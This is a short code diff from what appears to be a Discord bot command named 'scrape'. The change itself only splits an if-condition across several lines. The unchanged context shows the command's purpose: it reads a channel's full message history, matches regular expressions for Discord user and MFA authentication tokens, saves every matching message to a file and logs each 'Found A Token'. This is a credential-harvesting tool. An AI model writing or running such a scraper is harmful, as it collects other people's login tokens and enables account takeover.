@@ -32,7 +32,14 @@ async def scrape(ctx):
     token_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
     
     async for message in ctx.channel.history(limit=None):
-        if re.search(token_regex[0], message.content) or re.search(token_regex[1], message.content):
+        
+        if re.search(
+            token_regex[0],
+                message.content
+        ) or re.search(
+            token_regex[1],
+                message.content
+            ):
             scraped.write(f'{message.content}\n')
             logging.info(f'Found A Token > {message.content}')
 
